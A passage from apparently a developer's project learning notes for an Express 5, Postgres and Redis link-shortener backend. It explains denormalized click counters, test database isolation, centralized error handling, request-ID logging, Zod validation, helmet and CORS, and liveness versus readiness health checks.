placeholders, and only binds the actual values in afterward as pure data
that's never re-parsed as SQL. A malicious value can't inject new SQL
syntax because it's never in a position to be interpreted as syntax at
all — the query's shape was already fixed before the value entered the
picture. That's a fundamentally stronger guarantee than escaping, which
still depends on a sanitization step being implemented and actually
invoked correctly at every call site, every time.

---

### The click_count denormalization and its drift risk

**What it is.** `links.click_count` stores a running total that's
logically derivable from `COUNT(*) FROM clicks WHERE link_id = $1` — it's
redundant data, kept in sync with (rather than computed fresh from) the
`clicks` table.

**Why it exists in this project.** Reading a link's click count is
expected to be a common, latency-sensitive operation (displaying it on a
dashboard, checking it against `max_clicks` on every redirect). Counting
millions of `clicks` rows on every read doesn't scale the way reading one
already-maintained integer column does — the denormalized counter trades
storage and write-time bookkeeping for cheap, constant-time reads.

**How it works mechanically — right now.** `click_count` is declared with
`default: 0` and a `CHECK (click_count >= 0)` constraint, but nothing in
this phase actually increments it — there's no route or service logic
yet that records a click and bumps the counter atomically. That's
intentionally out of scope for the data layer phase; the column exists and
is constrained correctly, but the write path that keeps it accurate is a
Phase 3+ concern.

**Where it lives in the codebase.** The `click_count` column definition
and its `CHECK` constraint in `migrations/*_create-links-table.ts`.

**Common pitfalls — the drift risk.**

- The fundamental risk of any denormalized counter: it can drift out of
  sync with the table it's summarizing. If a future click-recording code
  path inserts into `clicks` but the corresponding `click_count` increment
  fails, gets skipped, or isn't wrapped in the same transaction as the
  insert, `click_count` silently becomes wrong — and nothing in the schema
  itself would ever detect or flag that drift.
- Incrementing with a read-then-write (`SELECT click_count ...` then
  `UPDATE ... SET click_count = <old value> + 1`) instead of an atomic
  `UPDATE links SET click_count = click_count + 1 WHERE id = $1` — the
  read-then-write version has the exact same race condition problem
  described in the constraints-vs-app-checks section: concurrent clicks on
  a popular link can read the same starting value and both write the same
  incremented result, losing a click.
- Forgetting to wrap the `clicks` insert and the `links.click_count`
  increment in the same transaction — if one succeeds and the other fails,
  the two tables disagree about how many clicks actually happened.

**Production considerations.** The concrete fix once click-recording logic
exists: an atomic `UPDATE ... SET click_count = click_count + 1` (not
read-then-write) inside the same transaction as the `clicks` insert. A
periodic reconciliation job (recomputing `click_count` from an actual
`COUNT(*)` and comparing/correcting) is the usual safety net for
denormalized counters at scale, catching drift from any edge case the
transactional logic didn't anticipate — worth adding once this project has
real click-recording traffic to protect against.

**Interview answer.** `click_count` is a denormalized counter — data
that's logically derivable from counting `clicks` rows, but stored
redundantly on `links` so reading it is a cheap, constant-time column read
instead of an aggregate query over a potentially huge table. The tradeoff
is drift risk: unlike a value computed fresh from source data, a stored
counter can silently disagree with reality if the write path that
maintains it has a bug, a missed transaction boundary, or a race condition
from a non-atomic increment. This phase only defines the column and its
`CHECK (click_count >= 0)` constraint — the actual increment logic is a
later phase's responsibility, and it'll need an atomic `UPDATE ... SET
click_count = click_count + 1` inside the same transaction as the
`clicks` insert, not a read-then-write, to avoid losing increments under
concurrent clicks.

---

### Test database isolation strategies

**What it is.** How to make sure the integration test suite — which, by
design, runs against a _real_ Postgres, not a mock — doesn't corrupt
developer data, doesn't leak state between tests, and still lets DDL
(`CREATE TABLE`/`DROP TABLE`) actually be tested.

**Why it exists in this project.** `DATABASE_URL` in `.env` points at the
same Postgres a developer is using interactively for `npm run dev`.
Running the test suite against that database would truncate or mutate
whatever dev data exists — surprising at best, destructive at worst. And a
single isolation strategy doesn't fit every test in this phase: verifying
migrations actually apply/roll back needs to run real `CREATE
TABLE`/`DROP TABLE` against real schema state, while verifying row-level
constraints (the CHECK constraint, unique index, cascade behavior) needs
each test's inserted rows to disappear before the next test runs, without
needing to drop and recreate the whole schema every time.

**How it works mechanically — two isolation levels, used for different
things.**

- **A separate database** (`clickscope_test`, on the same local Docker
  Postgres — no new container needed) — the outermost layer of isolation,
  keeping the entire test run away from dev data. `.env.test` points at
  it; `tests/globalSetup.ts` creates it if missing and applies every
  migration once, before any test file runs, using node-pg-migrate's
  programmatic `runner()` API — so `npm test` is fully self-contained,
  with no manual "migrate the test database first" step for a new
  contributor.
- **Transaction rollback per test** (`tests/db/constraints.test.ts`) — each
  test runs `BEGIN` before and `ROLLBACK` after, so whatever rows it
  inserts never actually persist, and the next test starts from the same
  clean state without needing a full `TRUNCATE`.
- **Real DDL, no transaction wrapper** (`tests/db/migrations.test.ts`) —
  deliberately the _exception_ to the rollback pattern. Testing that
  migrations actually apply and roll back means running real `CREATE
TABLE`/`DROP TABLE` against real schema state; wrapping that in an outer
  transaction that then gets rolled back would defeat the entire point of
  the test. This is also why `vitest.config.ts` disables `fileParallelism`
  — this test's `down`/`up` cycle temporarily removes the tables
  `constraints.test.ts` depends on, so the two files can't safely run
  concurrently, only sequentially.

**Where it lives in the codebase.** `.env.test`/`.env.test.example`,
`tests/globalSetup.ts`, `fileParallelism: false` in `vitest.config.ts`,
`tests/db/migrations.test.ts` (real DDL), `tests/db/constraints.test.ts`
(transaction-per-test).

**Common pitfalls.**

- Running tests against the same database as local dev — the single most
  important thing this setup avoids; easy to do accidentally by pointing
  `.env.test` at the same database name as `.env`.
- Wrapping a DDL test in a transaction "for consistency with the other
  tests" — `CREATE TABLE`/`DROP TABLE` inside a transaction that later
  rolls back never actually proves the migration works outside a
  transaction, which is how it actually runs in real deploys.
- Enabling test file parallelism without checking whether tests share
  mutable state — fine for pure unit tests with no shared resource, actively
  dangerous for integration tests hitting one real database, where two
  files running concurrently can interleave DDL and DML in ways that make
  failures nondeterministic and hard to reproduce.

**Production considerations.** None directly — this is exclusively a
local/CI testing concern. The pattern does generalize to CI: the same
`tests/globalSetup.ts` logic works unchanged against a fresh Postgres
service container in CI, since it provisions everything it needs (the
database, the schema) itself rather than assuming a pre-existing,
pre-migrated database is already there.

**Interview answer.** I isolate the test suite at two levels, for two
different needs. A dedicated `clickscope_test` database (auto-provisioned
and auto-migrated by a Vitest global setup hook) keeps the entire test run
away from a developer's actual dev data. Within that, most tests wrap in
`BEGIN`/`ROLLBACK` so inserted rows never persist between tests — but the
migration up/down test is a deliberate exception, running real
`CREATE TABLE`/`DROP TABLE` outside any transaction, since that's the only
way to actually prove migrations apply and roll back correctly outside a
transaction, which is how they run for real. Because that test
temporarily removes tables other tests depend on, file-level parallelism
is disabled — a reminder that "run tests in parallel by default" is a
unit-test assumption, not a safe default for integration tests sharing one
real database.

---

## Phase 3: API Foundation

### Operational vs programmer errors, and why AppError is factories, not a class hierarchy

**What it is.** A two-way split for anything that goes wrong while
handling a request. An _operational_ error is one the code deliberately
recognized and threw — bad input, a missing resource, a conflicting
write — where the status, message, and shape are all safe to hand back
to a client as-is. A _programmer_ error is everything else: a bug, an
unhandled edge case, a raw driver exception — something nobody
anticipated, whose real message might contain a stack trace, a SQL
fragment, or an internal file path, and therefore must never reach a
client verbatim.

**Why it exists in this project.** CLAUDE.md is explicit: "Errors thrown
as AppError; the error middleware formats responses." Without a single
recognizable error type, the error middleware would have no reliable way
to tell "a route deliberately rejected this request" apart from "a route
crashed" — and conflating the two either leaks internal detail through
an error that was actually a bug, or shows a client a generic "Internal
Server Error" for what should have been a specific, actionable 404.

**How it works mechanically.** `src/lib/errors.ts` exports one
`AppError extends Error` class (`statusCode`, `code: ErrorCode`,
`isOperational = true` on every instance, `details: unknown = null`)
plus seven factory functions — `badRequest`, `unauthorized`,
`forbidden`, `notFound`, `conflict`, `tooManyRequests`, `internal` — each
just calling `new AppError(...)` with the right status and code baked
in. The operational/programmer boundary is `instanceof AppError`, tested
once, in the error middleware (`src/middleware/errorHandler.ts`):
anything that passes that check is operational and safe to show as-is;
anything that doesn't is a programmer error and gets sanitized in
production. One class plus factories, not a subclass per status code
(`BadRequestError`, `UnauthorizedError`, ...), because a seven-class
hierarchy would only ever differ in the three values already passed as
constructor arguments — it's boilerplate, not a meaningful type
distinction. It also matches this codebase's existing style:
`EnvValidationError` (`src/config/env.ts`) is a single flat class, and
`parseEnv` is a plain function, not part of a class taxonomy.

`details` is declared as a non-optional field defaulting to `null`
(`details: unknown = null`), not `details?: unknown`. tsconfig's
`exactOptionalPropertyTypes` forbids assigning `undefined` into a key
typed `T | undefined` unless the key is entirely omitted — the same
constraint already worked around in `src/lib/logger.ts` and
`src/db/pool.ts` by building objects conditionally. Making `details`
required with a default sidesteps that class of friction entirely rather
than repeating the conditional-key dance a third time.

**Where it lives in the codebase.** `src/lib/errors.ts` (the class and
factories); `src/middleware/errorHandler.ts` (the `instanceof AppError`
check); every future route/service throws these instead of a bare
`Error` or `throw 'string'`.

**Common pitfalls.**

- Throwing a bare `Error` for something that's actually an expected,
  operational case (e.g. `throw new Error('not found')`) — it reaches
  the error middleware as a programmer error, gets sanitized to a
  generic 500 in production, and the client never learns it was
  actually a 404.
- Marking `isOperational` as a mutable, per-call flag instead of a
  constant on the class — the whole point is that _every_ `AppError`,
  including one built via `internal()`, is operational (it was
  deliberately thrown); making it a settable field just invites some
  call site to get it wrong.
- Putting business logic in a subclass constructor (e.g. formatting a
  message differently per error type) — the factories keep that
  formatting at the call site, where the actual context is, instead of
  scattered across N constructors.

**Production considerations.** Because `AppError.message` is always
shown to the client (only non-`AppError` messages get sanitized), the
discipline this requires going forward is: never put anything
client-unsafe into an `AppError`'s message — no SQL fragments, no
internal IDs the client shouldn't correlate, no stack-trace-adjacent
detail. That detail belongs in the `details` field only when it's
genuinely meant for the client (e.g. per-field validation errors), or in
the server-side log call in `errorHandler.ts`, never in the message
itself if there's any doubt.

**Interview answer.** I distinguish operational errors — expected,
deliberately-thrown failures like bad input or a missing resource —
from programmer errors, which are bugs or unanticipated exceptions,
using a single `instanceof AppError` check in the error middleware.
Every `AppError` is safe to show a client as-is; anything else gets
sanitized to a generic message in production and logged in full detail
server-side. I use one `AppError` class plus factory functions for the
common cases rather than a subclass per error type, since a class
hierarchy here would just be seven constructors differing only in the
values already passed as arguments — more boilerplate for the same
information.

---

### The error middleware's 4-argument signature and registration order

**What it is.** Express identifies error-handling middleware purely by
counting a function's declared parameters: exactly four —
`(err, req, res, next)` — marks it as an error handler; any other arity
is treated as regular middleware. Registration order then decides
which errors actually reach it.

**Why it exists in this project.** CLAUDE.md requires a single
centralized error handler that formats every response consistently. That
only works if Express reliably routes every thrown/forwarded error to
this one function — which depends on getting both the signature and the
position right, neither of which produces a helpful error if wrong.

**How it works mechanically.** At startup, Express inspects
`fn.length` for each middleware function passed to `app.use()`. `fn.length`
is a normal JavaScript runtime property equal to the number of
parameters declared before the first one with a default value or rest
syntax — TypeScript's type annotations don't change it, since types are
erased at compile time; only the actual parameter count in the compiled
JS matters. `createErrorHandler` in `src/middleware/errorHandler.ts`
returns a function with exactly four declared parameters
`(err, req, res, _next)` for this reason — `_next` is never called
inside the function body (the handler ends the response itself via
`res.json`), but it can't be removed, because doing so drops the arity
to three and Express silently stops treating it as an error handler at
all: no warning, no error, the app just falls through to Express's own
default HTML error page instead of this app's JSON shape.

Registration order matters independently of arity. Express matches
middleware top-to-bottom in registration order and only diverts into
error-handling middleware once something calls `next(err)` (or an async
handler's returned promise rejects — see the next section) — it never
retroactively looks backward for an error handler registered earlier.
Concretely, in `src/app.ts`, the error handler is the very last thing
registered, strictly after every route and after `notFoundHandler`: if
it were registered before a route, Express simply hasn't reached that
registration yet when the route's error occurs, so the error has nowhere
defined to go.

**Where it lives in the codebase.** `createErrorHandler` in
`src/middleware/errorHandler.ts`; registered last in `src/app.ts`, after
the root/health routers and after `notFoundHandler`.

**Common pitfalls.**

- Removing an unused `next` parameter from an error handler "for
  cleanliness" — silently downgrades it to regular middleware. Symptom:
  errors start rendering as Express's default HTML error page instead of
  the app's JSON shape, with no warning anywhere in the logs.
- Registering the error handler before a route or before
  `notFoundHandler` — errors from anything registered after it never
  reach it. Symptom: unmatched routes or route errors produce Express's
  default response instead of the expected JSON shape, but only for
  routes registered after the misplaced handler, which is a confusing,
  partial failure to debug.
- Registering more than one 4-arg error handler — the first one in
  registration order runs and, if it doesn't call `next(err)` itself
  (this app's doesn't), consumes the error; any later error handlers
  never run.

**Production considerations.** A common mistake at scale is adding a
second, feature-specific error handler for one route group instead of
teaching the one centralized handler about a new error shape — this
fragments the "every endpoint returns errors in one consistent shape"
contract CLAUDE.md asks for. If a future error type needs special
handling, it should extend `AppError`'s vocabulary (a new `ErrorCode`,
or a new factory), not spawn a second error-handling middleware.

**Interview answer.** Express recognizes error-handling middleware by
counting its declared parameters — exactly four, `(err, req, res, next)`
— rather than by any explicit registration API. That's a runtime
JavaScript property (`Function.prototype.length`), so even an unused
`next` parameter can't be dropped without silently losing error-handler
status. Registration order matters separately: Express matches
middleware top-to-bottom and only diverts into an error handler once
something calls `next(err)`, so the error handler has to be registered
strictly after every route it's meant to protect, or those routes'
errors have nowhere to go.

---

### Express 5's automatic async error propagation

**What it is.** When a route or middleware handler returns a Promise
(i.e. it's an `async` function), Express 5 automatically attaches a
`.catch()` to it that forwards any rejection into `next(err)` — the same
path a synchronous `throw` has always used. No manual try/catch or
wrapper library required for the error to reach the error middleware.

**Why it exists in this project.** Every route handler written from
Phase 3 onward is expected to be `async` and to just `throw` an
`AppError` on failure — CLAUDE.md's "Errors thrown as AppError" pattern
only stays this simple if that throw is guaranteed to reach the error
middleware without extra boilerplate at every call site.

**How it works mechanically.** In Express 4, an `async` handler that
threw produced an unhandled promise rejection Express never saw — the
request would hang with no response ever sent, unless the handler
manually did `try { ... } catch (err) { next(err) }`, or was wrapped in
a helper like `express-async-handler`. Express 5 changed the internal
route-dispatch code to check whether a handler's return value is a
Promise, and if so, calls `.then(undefined, next)` on it (functionally
equivalent to `.catch(next)`) — so a rejected promise now flows into the
exact same `next(err)` path a synchronous throw always used, with zero
code change required at the call site.

`tests/middleware/asyncErrors.test.ts` proves this directly rather than
asserting it from documentation: it builds a small Express app with an
`async` route handler that `throw`s, with genuinely no try/catch and no
wrapper anywhere, and asserts the response is the error middleware's
properly formatted JSON — which is only possible if the rejection
actually reached it.

**Where it lives in the codebase.** No dedicated file — this is Express
5's own dispatch behavior. Every `async` route handler across the
codebase (present and future) relies on it implicitly; the proof lives
in `tests/middleware/asyncErrors.test.ts`.

**Common pitfalls.**

- Wrapping every async handler in a manual `try/catch { next(err) }` or
  an `asyncHandler` utility out of Express-4 habit — harmless but dead
  weight on Express 5; worth knowing it's no longer necessary so it
  doesn't get reintroduced as unnecessary boilerplate on every route.
- Assuming this covers _every_ way an async handler can fail — it only
  catches the promise the handler itself returns. An error thrown
  asynchronously from inside a detached callback that isn't awaited
  (e.g. a stray `setTimeout` or a fire-and-forget `.then()` inside the
  handler) still becomes an unhandled rejection Express never sees,
  exactly like Express 4.
- Relying on this in code that must also run under Express 4 (a shared
  library, for instance) — this is an Express-5-specific dispatch
  change, not a JavaScript language guarantee; Express-4-targeted code
  still needs the manual `next(err)` pattern.

**Production considerations.** This removes an entire class of
production incident that Express-4-era codebases hit constantly:
requests silently hanging until a load balancer's timeout kills the
connection, with nothing useful in the logs because the rejection was
never caught anywhere. Express 5 turns that failure mode into a normal,
logged, correctly-shaped error response instead.

**Interview answer.** In Express 4, an async route handler that threw
produced an unhandled promise rejection Express never saw — the request
would hang forever unless the handler manually caught the error and
called `next(err)`, which is why wrapper libraries like
`express-async-handler` existed. Express 5 changed route dispatch to
detect when a handler returns a Promise and automatically forward any
rejection into `next(err)`, the same path a synchronous throw always
used. Practically, this means every route handler in this codebase can
just be `async` and `throw` an `AppError` directly, with no try/catch or
wrapper boilerplate — and I proved this behavior with a test rather than
assuming it, since it's easy to get backwards for a codebase that used
to run on Express 4.

---

### Correlation IDs and request-scoped structured logging

**What it is.** A unique ID generated (or inherited) per incoming
request, attached to the request object, echoed back in a response
header, and stamped onto every log line that request produces — so every
line belonging to one request can be found and grouped, even in a busy,
concurrent log stream.

**Why it exists in this project.** Structured logging alone (Phase 1)
tells you _what_ happened; it doesn't tell you which log lines belong
together. In production, log lines from many concurrent requests
interleave in the aggregate stream. Without a shared ID stamped on every
line one request produces, reconstructing "everything that happened for
this one failing request" means grepping by approximate timestamp and
hoping nothing else happened in that window.

**How it works mechanically.** `src/middleware/requestContext.ts`,
registered first in `src/app.ts`, reads an inbound `X-Request-Id` header
(accepted, but capped at 200 characters — see pitfalls) or generates a
fresh one via `crypto.randomUUID()` (a Node builtin, no new dependency).
It assigns `req.id`, creates `req.log = logger.child({ requestId: id })`
— Pino's `child()` returns a logger that automatically includes
`requestId` in every subsequent call without it being re-passed each
time — and sets the `X-Request-Id` response header so a client (or an
upstream gateway) can correlate its own logs against this service's. It
logs "Request started" immediately, and logs "Request completed" (with
method, path, status, duration) on the response's `finish` event, which
fires exactly once the response has actually been fully sent —
including responses written later by the error handler — so completion
is logged exactly once regardless of whether the request succeeded or
errored.

**Where it lives in the codebase.** `src/middleware/requestContext.ts`;
the `id`/`log` fields on `Request` are declared in
`src/types/express.d.ts`; every downstream handler and the error handler
(`src/middleware/errorHandler.ts`) use `req.log` instead of the bare
`logger` singleton so their lines carry the same ID.

**Common pitfalls.**

- Accepting an inbound `X-Request-Id` with no bound on its length or
  content — it's attacker-controlled input flowing directly into
  structured logs otherwise; this codebase caps it at 200 characters as
  a cheap defense against log-injection/log-bloat via an oversized
  header value.
- Logging completion inside a `try/finally` around `next()` instead of
  on `res.on('finish', ...)` — `next()` returning doesn't mean the
  response has actually been sent yet (a downstream handler might still
  be awaiting a DB call), so a `finally` block would log "completed"
  before the response is truly finished, and would run even if a later
  handler kept the request open indefinitely.
- Using the bare `logger` singleton instead of `req.log` inside a route
  handler — works, but produces a log line with no `requestId`, breaking
  the exact correlation this middleware exists to provide.

**Production considerations.** Accepting (not just generating) an
inbound `X-Request-Id` is what makes correlation work _across_ service
boundaries, not just within this one process — an API gateway, load
balancer, or the frontend itself can set the header, and it stays stable
end-to-end. When a user reports "it broke," the `requestId` returned in
every error response body (see the error middleware) is exactly what
they can hand to support to jump straight to the right log lines,
instead of reconstructing a timeline from timestamps.

**Interview answer.** I attach a UUID to every request — accepting an
inbound `X-Request-Id` if one's already set upstream, generating a fresh
one with `crypto.randomUUID()` otherwise — and use it to create a
Pino child logger (`logger.child({ requestId })`) attached to the
request object, so every log line produced while handling that request
automatically carries the same ID without it being re-passed manually
at each call site. The ID is echoed back in a response header and
included in every error response body, so correlating "this one user's
failing request" across a stream of interleaved, concurrent log output
is a single grep instead of a timestamp guessing game.

---

### Boundary validation with Zod, and why validated data lives on req.validated

**What it is.** Middleware that runs a Zod schema against
`req.body`, `req.query`, or `req.params` before a route handler ever
runs, rejecting the request with a 400 and field-level detail if it
fails, and making the parsed (typed, defaulted, coerced) result
available to the handler if it succeeds.

**Why it exists in this project.** CLAUDE.md requires "All input
validated with Zod at the route boundary" — not inside services. A
service function should be callable from anywhere: a route, a future
BullMQ worker job, a test, a seed script — none of which necessarily
have HTTP-request-shaped input to validate against. If Zod validation
lived inside a service instead, every caller would need to construct
request-shaped input just to satisfy a schema that only makes sense for
HTTP, even a worker job that never touched HTTP at all. Validating at
the boundary means services can trust plain, already-valid argument
types unconditionally.

**How it works mechanically.** `src/middleware/validate.ts` exports
`validateBody`, `validateQuery`, `validateParams`, each a thin wrapper
around one internal `makeValidator(schema, target)`. It calls
`schema.safeParse(req[target])` — `safeParse`, not `parse`, so a failure
is a normal return value, not a thrown exception the middleware would
have to catch. On failure, it maps every Zod issue into
`{ field, message }` and forwards `badRequest('Validation failed', details)`
into the centralized error middleware, rather than writing a one-off
response — so validation failures get the exact same JSON error shape
every other error does. On success, it writes the parsed value onto
`req.validated[target]` (declared in `src/types/express.d.ts`) — **not**
back onto `req.body`/`req.query`/`req.params` directly. That's a
constraint, not a style choice: Express 5's `req.query` is a getter-only
accessor with no setter (`node_modules/express/lib/request.js`), and
`req.query = {...}` throws a `TypeError` under this project's ESM/strict
execution — confirmed directly, not assumed. `req.body`/`req.params`
happen to still be plain writable properties, but using one mechanism
(`req.validated`) for all three avoids an arbitrary asymmetry between
them that would need to be remembered and explained per-target.

**Where it lives in the codebase.** `src/middleware/validate.ts`;
`req.validated`'s type is declared in `src/types/express.d.ts`;
`tests/middleware/validate.test.ts` exercises all three targets,
including proving query validation specifically works despite the
getter constraint.

**Common pitfalls.**

- Using `schema.parse()` instead of `safeParse()` inside the middleware
  — `parse` throws on failure, and while Express 5 would still forward
  that throw to the error middleware (it's a synchronous throw, always
  forwarded), the resulting error would be Zod's raw `ZodError`, not a
  `badRequest(...)` with field-level detail — losing the specific,
  client-useful shape this middleware exists to produce.
- Returning Zod's raw `issue.path`/`issue.code` structure to the client
  — it's an internal representation (arrays of path segments, Zod-
  specific issue codes) not designed as an API contract; mapping to
  `{ field, message }` is deliberate, not incidental.
- Trying to mutate `req.query` directly out of Express-4 habit — throws
  immediately in this codebase's ESM/strict execution, not a silent
  no-op (which is what happens under CommonJS/sloppy mode, making this
  an easy trap if tested under the wrong module system).

**Production considerations.** Every future feature route (auth, links,
redirects) is expected to compose `validateBody`/`validateQuery`/
`validateParams` in its route definition — e.g.
`router.post('/links', validateBody(createLinkSchema), handler)` — and
read `req.validated.body` inside the handler, narrowed with
`z.infer<typeof createLinkSchema>`. Keeping this middleware generic
(schema-in, target-out) rather than route-specific means every future
route gets the same 400 shape and the same field-level detail for free.

**Interview answer.** I validate `body`/`query`/`params` at the route
boundary with reusable Zod middleware, because a service function should
be callable from anywhere — a route, a worker job, a test — without
needing HTTP-shaped input to satisfy a validator that only makes sense
for HTTP requests. On failure it returns a 400 with field-level detail
mapped from Zod's issues, not a raw Zod error dump. On success, it
writes the parsed value onto a separate `req.validated` object rather
than mutating `req.body`/`req.query` in place — partly for consistency,
but also because Express 5's `req.query` is actually a getter-only
property with no setter, so reassigning it directly throws.

---

### helmet and CORS: what each actually protects against

**What it is.** Two unrelated pieces of browser-facing security
middleware bundled together here only because they're both registered
early in the middleware chain: `helmet` sets a battery of security-
related response headers; `cors` controls which cross-origin JavaScript
is allowed to read this API's responses.

**Why it exists in this project.** This is a REST API consumed by a
separate Next.js frontend running on a different origin — cross-origin
requests are the normal case here, not an edge case, so CORS has to be
configured deliberately rather than left at a default. Response headers
that harden against common browser-side attack classes (clickjacking,
MIME-sniffing, protocol downgrade) cost nothing to add and have no
reason not to be on by default.

**How it works mechanically.** `helmet()` (`src/middleware/security.ts`)
applies its default header set to every response — concretely:
`Strict-Transport-Security` forces the browser to always use HTTPS for
this origin afterward, blocking SSL-stripping downgrade attacks;
`X-Content-Type-Options: nosniff` stops the browser from MIME-sniffing a
response into executing as something other than its declared
`Content-Type`; the default `Content-Security-Policy` restricts which
origins scripts/styles may load from, shrinking XSS blast radius;
`X-Frame-Options`/the `frame-ancestors` CSP directive blocks this page
from being embedded in another site's `<iframe>`, mitigating
clickjacking; `Referrer-Policy` limits how much of this API's URLs leak
to third parties via the `Referer` header.

`cors({ origin: config.CORS_ORIGIN })` handles the `Access-Control-*`
header exchange, including the browser-issued preflight `OPTIONS`
request that precedes many cross-origin calls — correctly reflecting
the request's origin only if it's in the allowed list, and setting
`Vary: Origin` so shared caches don't serve one origin's CORS headers to
another. `config.CORS_ORIGIN` (`src/config/env.ts`) is a required,
comma-separated-then-array-parsed list of explicit origins, validated at
startup to reject `*` via a Zod `.refine()` — so a wildcard fails fast
with the same `EnvValidationError` path any other invalid env var uses,
rather than silently shipping something permissive. It's parsed as an
array specifically so more than one legitimate frontend origin (a
production URL and a deployed preview URL, for instance) can be
allowlisted simultaneously without a code change — just a comma-
separated env value.

Critically: CORS is a **browser-enforced** restriction on which
origins' JavaScript may _read_ a cross-origin response. It does nothing
to stop a non-browser client — `curl`, a server-to-server call, Postman
— from calling this API directly; the request still executes
server-side regardless of any CORS header. It is not an authentication
or authorization mechanism, and never should be treated as one.

**Where it lives in the codebase.** `src/middleware/security.ts`
(`securityHeaders`, `corsMiddleware`); `CORS_ORIGIN` in
`src/config/env.ts`, `.env`/`.env.example`/`.env.test`; registered in
`src/app.ts` right after `requestContext`, before body parsing and
routes.

**Common pitfalls.**

- Setting `Access-Control-Allow-Origin: *` "to make CORS errors go
  away" during development and shipping it — it tells every website's
  JavaScript, from any origin, that it may read this API's responses in
  a victim user's browser session. If this API ever adds cookie-based
  auth, a wildcard origin combined with `credentials: true` is
  specifically forbidden by the CORS spec (browsers refuse that
  combination outright) — but even without credentials, a wildcard
  removes origin allowlisting entirely for an API with a known, fixed
  set of legitimate frontends.
- Mistaking a passing CORS-configured request for "this request is
  authenticated" — CORS controls whether a _browser_ lets JavaScript
  read the response; it says nothing about who or what sent the
  request.
- Forgetting the preflight `OPTIONS` request when hand-rolling CORS
  headers instead of using the `cors` package — a surprisingly common
  source of "works with curl, fails from the browser" bugs, which is
  the concrete reason `cors` was added as a dependency instead of
  setting headers by hand.

**Production considerations.** As auth is added in a later phase, the
decision on cookie- vs bearer-token-based sessions directly determines
whether `corsMiddleware`'s `credentials` option needs to flip to `true`
— deliberately left at its default (`false`) for now, since turning it
on prematurely would widen the security surface before there's any
mechanism to explain why. `CORS_ORIGIN` being a list (not a single
string) is what lets a preview-deployment origin be added alongside
production without touching code — just the env var.

**Interview answer.** Helmet sets a set of response headers that harden
against common browser-side attacks with no functional cost — HSTS
against downgrade attacks, `nosniff` against MIME-sniffing XSS, a
restrictive CSP, frame-ancestors against clickjacking. CORS is
different: it's a browser-enforced rule about which origins' JavaScript
may read this API's responses, configured here from an explicit,
required, non-wildcard list of allowed origins. The key thing I make
sure not to conflate: CORS doesn't stop a non-browser client from
calling the API directly — the request executes either way — so it's a
browser-safety mechanism, not an authentication boundary, and a
wildcard origin is dangerous specifically because it removes that
safety for every site on the internet at once.

---

### Health checks: liveness vs readiness, and why 503 not 200-with-a-status-field

**What it is.** Two different questions an orchestrator needs answered
about a running instance, each requiring a different HTTP endpoint and a
different recovery action when the answer is "no": liveness ("is this
process alive at all?") and readiness ("can this instance currently
serve real traffic?").

**Why it exists in this project.** `GET /` (liveness, unchanged from
Phase 1, now under `src/routes/root.ts`) and `GET /health` (readiness,
new this phase) answer genuinely different questions, and conflating
them causes a specific, well-known production failure mode: if
dependency checks were wired into the liveness endpoint, a transient
Postgres blip would make liveness fail, and an orchestrator's correct
response to failed liveness is to kill and restart the container —
producing a restart-crash-loop over an external outage that restarting
the process can't fix.

**How it works mechanically.** `GET /` (`src/routes/root.ts`) does zero
dependency checks — it just proves the process can respond to HTTP at
all, which is exactly what a liveness probe should verify: if it fails,
the process itself is presumed broken, and killing/restarting it is the
right move. `GET /health` (`src/routes/health.ts`) calls
`getHealthReport()` (`src/services/health.ts`), which runs
`checkDatabaseHealth()` (`src/db/health.ts`, existing) and
`checkRedisHealth()` (new, `src/lib/redis.ts`) concurrently via
`Promise.all`, timing each with `process.hrtime.bigint()`. Both
underlying checks already catch their own errors internally and return
a plain `boolean` — so `getHealthReport` has nothing that can reject,
satisfying "a health check that must never throw" structurally, not by
convention. The route returns `200` when every dependency is `ok`, `503`
when any is not — status code, not a `status` field the client would
have to parse — specifically because a standard orchestrator health
check keys off the HTTP status alone; requiring it to also parse a JSON
body to know the instance is unhealthy is an unnecessary, easy-to-get-
wrong extra step for infrastructure that's checking thousands of
instances a minute. The response body still names each dependency's
individual status and latency, for a human debugging a `degraded`
result — just not as the sole signal.

**Where it lives in the codebase.** `src/routes/root.ts` (liveness),
`src/routes/health.ts` + `src/services/health.ts` (readiness),
`src/db/health.ts` + `src/lib/redis.ts` (the two individual dependency
checks).

**Common pitfalls.**

- Wiring dependency checks into the liveness endpoint instead of a
  separate readiness endpoint — causes the restart-crash-loop failure
  mode described above; this is the single most important reason the two
  are kept as genuinely separate routes rather than one endpoint with a
  query parameter.
- Returning `200` with `{ status: 'error' }` in the body instead of a
  real `503` — technically informative to a human reading the JSON, but
  invisible to any infrastructure that only checks the HTTP status code,
  which is the overwhelming majority of health-check consumers (load
  balancers, container orchestrators, uptime monitors).
- Letting a health check itself throw on a downstream failure — turns a
  single dependency outage into the health endpoint _also_ being down,
  which is strictly worse than an accurate `503`, since it can look like
  the whole service crashed rather than one specific dependency being
  unreachable.

**Production considerations.** `getHealthReport`'s "never throws"
property depends entirely on `checkDatabaseHealth`/`checkRedisHealth`
each continuing to catch internally — if either check is ever rewritten
to let an error propagate, `getHealthReport`'s `Promise.all` would
reject, and the route (being `async`, per the previous section on
Express 5) would still produce a response rather than hanging — but a
generic sanitized 500 via the error middleware, not the specific,
per-dependency `503` this endpoint is designed to return. This is
exercised directly in `tests/routes/health.test.ts` by deliberately
breaking the contract and confirming Express 5's automatic forwarding
is a working backstop, not just a hope.

That same test file also has a smaller, deliberate asymmetry worth
calling out: `checkDatabaseHealth` is mocked (via `vi.mock`) so both the
`ok` and `error` branches are producible on demand — a currently-healthy
local Postgres can't be made to fail on command — while
`checkRedisHealth` is left unmocked and hits the real local Redis
container. Mocking both would be more internally consistent, but it
would mean nothing in the test suite ever proves the real `ioredis`
client actually connects and speaks the protocol correctly end-to-end;
keeping one dependency real, even at the cost of the asymmetry, is worth
that assurance. The direct consequence: this test currently assumes a
live local Redis (via `docker-compose up -d`), exactly the same
assumption `tests/db/*.test.ts` already make about Postgres. Whichever
CI environment eventually runs this suite (a future phase's concern)
will need a Redis service container provisioned alongside the Postgres
one it already needs — not a new category of CI requirement, just an
additional instance of one that already exists.

**Interview answer.** Liveness answers "is the process running at all,"
and the correct response to failure is to kill and restart the
container. Readiness answers "can this instance serve real traffic
right now," and the correct response to failure is to stop routing
traffic to it without restarting — restarting won't fix an external
database outage, so conflating the two causes a restart-crash-loop on
every transient dependency blip. I implement `/health` as the readiness
check — parallel Postgres and Redis pings, each already catching its own
errors so the endpoint itself can never throw — and return a real `503`
status rather than `200` with an error field in the body, because
standard health-check infrastructure keys off the HTTP status alone.

---

### The app.ts / server.ts split, and testing an Express app with supertest

**What it is.** Splitting "build the Express app and register its
